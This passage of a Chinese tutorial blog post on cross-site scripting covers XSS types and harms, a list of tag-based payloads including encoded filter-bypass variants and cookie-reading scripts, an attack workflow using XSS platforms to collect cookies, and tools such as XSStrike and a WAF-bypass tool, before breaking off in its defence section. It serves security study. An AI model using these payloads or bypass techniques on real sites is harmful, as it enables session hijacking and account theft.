data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1628132918301-6d92440b-aa98-4275-a9bf-b7f7658b568a.png?x-oss-process=image/resize,w_908/resize,w_750,limit_0" alt="img"></p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户<u>在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本</u>，导致被攻击的行为。通常出现在<u>搜索框、留言板、评论区</u>等地方。</p>
+<p>与 SQL 注入类似，XSS 也是利用提交恶意信息来实现攻击效果的攻击行为。但是 <u>XSS 一般提交的是 Javascript 脚本</u>，<u><strong>运行在 Web 前端</strong></u>，也就是用户的浏览器；而 SQL 注入提交的 SQL 指令是在后台数据库服务器执行。所以两者攻击的对象是不一样的。</p>
+<p><strong>攻击流程如下：</strong></p>
+<ul>
+<li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
+<li>诱使受害者打开受到攻击的服务器URL。</li>
+<li>受害者在Web浏览器中打开URL，恶意脚本执行。</li>
+</ul>
+<p><strong>本质</strong>：前端对于用户提交的参数没有审查就用于页面加载；</p>
+<p><strong>产生层面</strong>：前端，浏览器；攻击目标是通过前端脚本获取用户的数据。</p>
+<p><strong>XSS常用的函数类</strong>：输出类：echo printf print print_r sprintf die var-dump var_export</p>
+<p><strong>攻击成功与否受浏览器内核影响</strong>。一些高版本浏览器内核会主动过滤恶意脚本，阻止XSS攻击。</p>
+<p>通常，在XSS攻击中，攻击者会通过邮件或其他方式诱使用户点击包含恶意代码的链接，例如攻击者通过E-mail向用户发送一个包含恶意代码的网站home.com，用户点击链接后，浏览器会在用户毫不知情的情况下执行链接中包含的恶意代码，将用户与home.com交互的Cookie和Session等信息发送给攻击者，攻击者拿到这些数据之后，就会伪装成用户与真正的网站进行会话，从事非法活动，其过程如下图所示。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1618208947784_xss%E8%B7%A8%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.jpg" alt="1618208947784_xss跨脚本攻击.jpg"></p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>受JS脚本的功能决定。</p>
+<ol>
+<li><p><strong>挂马、挖矿</strong></p>
+</li>
+<li><p><strong>盗取用户Cookie。</strong></p>
+</li>
+<li><p>DOS（拒绝服务）客户端浏览器。</p>
+</li>
+<li><p><strong>钓鱼攻击</strong>，高级的钓鱼技巧。</p>
+</li>
+<li><p><strong>恶意篡改页面。</strong></p>
+</li>
+<li><p><strong>劫持用户Web行为</strong>，甚至进一步渗透内网。</p>
+</li>
+<li><p>爆发Web2.0<strong>蠕虫</strong>。</p>
+</li>
+<li><p>蠕虫式的DDoS攻击。</p>
+</li>
+<li><p>蠕虫式挂马攻击、<strong>植入广告，或者发送垃圾信息、刷浏量</strong>、破坏网上数据</p>
+</li>
+<li><p>其它安全问题</p>
+</li>
+</ol>
+<h2 id="常用攻击语句"><a href="#常用攻击语句" class="headerlink" title="常用攻击语句"></a>常用攻击语句</h2><p>一般会借助HTML标签的一些触发事件来执行攻击脚本。</p>
+<ul>
+<li><p><strong>script标签</strong></p>
+<p>在 HTML 页面中插入一段 JavaScript：</p>
+<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+</li>
+<li><p><strong>img标签</strong></p>
+<p>img标签支持 <strong>onerror</strong> 事件属性，在装载文档或图像的过程中如果发生了错误，就会触发<strong>onerror</strong>事件。利用<strong>onerror</strong>的特性来完成XSS。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>svg标签</strong></p>
+<p>svg标签支持 <strong>onload</strong> 时间属性，页面结束加载之后触发。</p>
+<p><code>&lt;svg onload=alert(1)&gt;</code></p>
+</li>
+<li><p><strong>超链接标签</strong></p>
+<p>解析href所指链接，此处作用是发生动作时执行一段javascript代码。</p>
+<p><code>&lt;a href=javascript:alert(1)&gt;&lt;/a&gt;</code></p>
+</li>
+<li><p><strong>audio标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>video标签</strong></p>
+<p><code>&lt;video src=x onerror=prompt(1);&gt;</code></p>
+</li>
+<li><p><strong>div标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/1/))&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span>     ie浏览器执行</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>%<span class="attr">3d</span>&#x27;<span class="attr">alert</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>&#x27;&gt;</span>DIV&lt;%2fdiv&gt;   url编码绕过</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>math标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span>&lt;a/xlink:href=javascript:prompt(1)&gt;Xss</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">href</span>=<span class="string">&quot;javascript:javascript:alert(1)&quot;</span>&gt;</span>Xss<span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>button标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;button/onclick=alert(1) &gt;xss<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>keygen标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen/onfocus=prompt(1);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>object标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">base64</span><br><span class="line">编码：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    </span><br><span class="line">解码：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>iframe标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">width</span>%<span class="attr">3d</span>&quot;<span class="attr">420</span>&quot; <span class="attr">height</span>%<span class="attr">3d</span>&quot;<span class="attr">315</span>&quot; <span class="attr">frameborder</span>%<span class="attr">3d</span>&quot;<span class="attr">0</span>&quot; <span class="attr">onload</span>%<span class="attr">3d</span>&quot;<span class="attr">alert</span>(<span class="attr">document.cookie</span>)&quot;&gt;</span>&lt;%2fIFRAME&gt;</span><br><span class="line">&lt;iframe%2fsrc%3d&quot;data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>%<span class="attr">3d</span>&#x27;%<span class="attr">26lt</span>%<span class="attr">3bbody</span> <span class="attr">onload</span>%<span class="attr">3dprompt</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>%<span class="attr">26gt</span>%<span class="attr">3b</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反弹型-XSS（非持续型）"><a href="#反弹型-XSS（非持续型）" class="headerlink" title="反弹型 XSS（非持续型）"></a>反弹型 XSS（非持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php（XSS在前端执行）&#x3D;&gt; 回包</p>
+<p>反射型 XSS 是指恶意的<u>攻击脚本包含在 <strong>URL</strong> 中</u>，<u>只有当用户主动访问了包含恶意脚本的 URL，脚本才会被成功执行</u>。反射型的攻击，<strong>攻击脚本经过后台服务器，但是不会写入网站的数据库，是一次性的攻击</strong>，所以黑客一般需要诱骗用户点击包含攻击脚本的 URL（钓鱼邮件），才能攻击成功。</p>
+<p>比如在get请求中构造攻击语句，输出用户在该网站的cookie：</p>
+<p><code>?name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>（name参数为数值的话就不加引号）</p>
+<p>该语句输出到页面的HTML就变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163239269.png" alt="image-20220728163239269"></p>
+<h3 id="存储型-XSS（持续型）"><a href="#存储型-XSS（持续型）" class="headerlink" title="存储型 XSS（持续型）"></a>存储型 XSS（持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php &#x3D;&gt; XSS被写入数据库 &#x3D;&gt; 他人访问页面执行index.php &#x3D;&gt; 回包（XSS在前端被执行） </p>
+<p>存储型 XSS 则是<u>把攻击脚本提交到网站 <strong>后台数据库</strong>，只要有人访问了显示该数据内容的页面，就会被攻击</u>。存储型XSS又称持久型XSS，<strong>攻击脚本将被永久地存放在目标服务器的数据库或文件中</strong>，可能存在于一些我们信任的网站，具有很高的隐蔽性。</p>
+<p>攻击方式：这种攻击<u>多见于论坛、博客和留言板</u>，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p>
+<p>相对于反射型，存储型的 XSS 成功率更高。</p>
+<p>比如，下面的网站有留言板功能，尝试在 Name框或者Message 框提交弹窗脚本输出当前 cookie，可以构造如下XSS攻击语句<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，网站在回显我的留言时XSS脚本就会在HTML中执行。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728161005216.png" alt="image-20220728161005216"></p>
+<h3 id="DOM-型-XSS（DOM）"><a href="#DOM-型-XSS（DOM）" class="headerlink" title="DOM 型 XSS（DOM）"></a>DOM 型 XSS（DOM）</h3><p>过程：参数x&#x3D;xss 然后发包 &#x3D;&gt; 携带该参数执行本地浏览器前端代码（XSS在前端被执行） （&#x3D;&gt; index.php &#x3D;&gt; 回包）</p>
+<ul>
+<li><p><strong>DOM</strong></p>
+<p>DOM全称Document Object Model，使用DOM可以使程序和脚本能够<strong>动态访问和更新文档的内容、结构及样式</strong>。根据用户在页面的操作或提交的参数，对网页进行动态更新，比如点击查看更多、在页面输入内容后立即回显在页面等。</p>
+<p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。 通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节<br>点)均可被修改，也可以创建或删除节点。HTML DOM树结构如图所示。</p>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728165551769.png" alt="image-20220728165551769" style="zoom:67%;" />
+
+<p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p>
+</li>
+<li><p><strong>DOM型XSS</strong></p>
+<p>DOM 型 XSS 是指 <strong>基于DOM文档对象模型</strong> 的 XSS 攻击，攻击的输出点就位于 DOM 对象上，如<code>document.referer</code>、<code>document.write</code>等等，是一种特殊类型的反射型XSS。<strong>由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞<u>不需要与服务器端交互</u>，它<u>只发生在客户端处理数据的阶段</u>。</strong></p>
+<p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，<u>DOM对象就会处理XSS代码，在本地浏览器前端HTML执行攻击脚本，导致存在XSS漏洞</u>。</p>
+</li>
+<li><p><strong>举例</strong></p>
+<p>比如下面的网站功能是选择一种语言，会以get请求接收参数default，并且在前端回显（会在HTML中用到所提交的参数）。查看页面HTML代码，发现default的值被用于以 <code>document.write</code> 的方式来写入网页，使网页显示所选的language，由此确定页面的XSS方式为DOM型。（对客户端网页进行了访问和更新）</p>
+<p>在 URL 后直接加入攻击脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，即可实现攻击。</p>
+<p>有时需要查看页面HTML源码，考虑闭合语法。比如当使用<code>img</code>标签进行攻击时，攻击脚本应为 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，以闭合select和option标签。</p>
+</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163628648.png" alt="image-20220728163628648"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163440677.png" alt="image-20220728163440677"></p>
+<ul>
+<li><p><strong>防御</strong></p>
+<p>比如用户输入的参数”$var”被用于如下代码，造成DOM型的XSS。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27; &gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了防御这种XSS，可以采用编码的方法，在”$var” 输出到&lt;script&gt;时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待：如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode，以免又被自动解码。（<strong>执行两次编码</strong>）</p>
+<p>也就是说，从javascript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。</p>
+</li>
+</ul>
+<h2 id="XSS攻击过程"><a href="#XSS攻击过程" class="headerlink" title="XSS攻击过程"></a>XSS攻击过程</h2><ul>
+<li><p>寻找目标网站</p>
+<p>有注册输入栏、留言板之类的网站，能回显输入（也就是会在HTML中用到输入的参数）。</p>
+</li>
+<li><p>尝试提交攻击脚本，探查过滤规则，确定可行的攻击语句</p>
+<p>可以使用自己构造的攻击语句；</p>
+<p>也可以搜索XSS平台，借助XSS平台构造所需要功能的攻击语句。比如xsshs.cn、xss8.cc等。一般平台构造的语句中含有平台的链接，受害者执行攻击脚本中的该链接，导致XSS，然后在XSS平台可以查看到相应的执行结果。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171550607.png" alt="image-20220730171550607"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171634759.png" alt="image-20220730171634759"></p>
+</li>
+<li><p>查看网页元素，确定脚本执行情况</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171933630.png" alt="image-20220730171933630"></p>
+<p>攻击脚本执行成功后，查看XSS平台，获取到浏览器信息，比如cookie。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i0.hdslb.com/bfs/article/a6b01bee60a6cf7ea796d29f3d6a2e7efb2c7a84.png@831w_318h_progressive.webp" alt="img"></p>
+</li>
+<li><p>根据获得的信息进行进一步攻击</p>
+<p>比如是网站的管理员执行了XSS，受到攻击，那么就能获取到管理员的cookie。</p>
+<p>用户凭据：通过凭据可以判断对方身份信息</p>
+<p><strong>cookie</strong>：存储本地，存活时间较长，常用于小中型网站（账号登录）</p>
+<p><strong>session</strong>：会话，存储服务器（占用服务器资源），存活时间较短，常用于大型网站（支付）</p>
+</li>
+</ul>
+<h2 id="XSS自动化工具"><a href="#XSS自动化工具" class="headerlink" title="XSS自动化工具"></a>XSS自动化工具</h2><p><strong>XSStrike</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
+<p>XSStrike <strong>主要支持反射和 DOM XSS</strong>，支持扫描；多线程爬虫；Context 分析；可配置的核心；检测和规避 WAF；老旧的 JS 库扫描；智能 payload 生成器；手工制作的 HTML &amp; JavaScript 解析器；强大的 fuzzing 引擎；盲打 XSS 支持；高效的工作流；完整的 HTTP 支持；Bruteforce payloads 支持；Payload 编码。 </p>
+<p>XSStrike常用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间（防止cc拦截）</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure>
+
+<p>使用流程：</p>
+<ul>
+<li><strong>运行工具</strong></li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084135009.png" alt="image-20220801084135009"></p>
+<ul>
+<li><p><strong>fuzzer攻击语句扫描</strong></p>
+<p>确定网站会过滤哪些语句，哪些语句又不会被拦截。</p>
+<p>—offline说明waf是离线的状态，这里是因为该工具为外国开发，识别不到安全狗。</p>
+<p>—passed为没有拦截，filtered为有过滤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084340700.png" alt="image-20220801084340700"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084529954.png" alt="image-20220801084529954"></p>
+</li>
+<li><p><strong>测试扫描结果</strong></p>
+</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084601132.png" alt="image-20220801084601132"></p>
+<ul>
+<li><p><strong>选择攻击语句</strong></p>
+<p>选择一个不会被拦截的XSS攻击语句，</p>
+</li>
+<li><p><strong>在浏览器中进行攻击</strong></p>
+<p>有可能出现请求过于频繁，被网站拦截</p>
+<p>—对于拦截，请求频繁被cc攻击拦截后，重启靶场phpStudy即可</p>
+<p>—实际进行网站测试时，可以现在本地搭建环境，测试那些语句不会拦截在进行漏洞测试</p>
+<p>—还有一种方法：用代理（比较麻烦）</p>
+</li>
+</ul>
+<p><strong>或者直接自动攻击</strong>：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085042713.png" alt="image-20220801085042713"></p>
+<p><strong>配合字典进行fuzz模糊测试：</strong></p>
+<p><strong>xssfuzz在线fuzz工具</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a></p>
+<p>用于自动生成各种XSS攻击payload：</p>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220731151629014.png" alt="image-20220731151629014" style="zoom:50%;" />
+
+<p><strong>BP配合fuzzDicts进行攻击：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085514970.png" alt="image-20220801085514970"></p>
+<p>name参数作为变量：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085535275.png" alt="image-20220801085535275"></p>
+<p>选择字典文件：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085627325.png" alt="image-20220801085627325"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085645342.png" alt="image-20220801085645342"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085833954.png" alt="image-20220801085833954"></p>
+<p>不同的执行结果，返回的网页数据包长度会不同，这里数据包更大的表示XSS攻击失败：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085929875.png" alt="image-20220801085929875"></p>
+<p><strong>xwaf</strong></p>
+<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/news/127001.html">http://www.freebuf.com/news/127001.html</a></p>
+<p>xwaf是一个python写的waf自动绕过工具。上一个版本是bypass_waf，xwaf相比bypass_waf更智能，可无人干预,自动暴破waf。</p>
+<h2 id="XSS防护建议"><a href="#XSS防护建议" class="headerlink" title="XSS防护建议"></a>XSS防护建议</h2><ul>
+<li><p><strong>代码过滤</strong>（黑名单）</p>
+<p>包括URL、查询关键字、HTTP头、POST 数据等，仅接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律进行过滤。</p>
+</li>
+<li><p><strong>HttpOnly</strong></p>
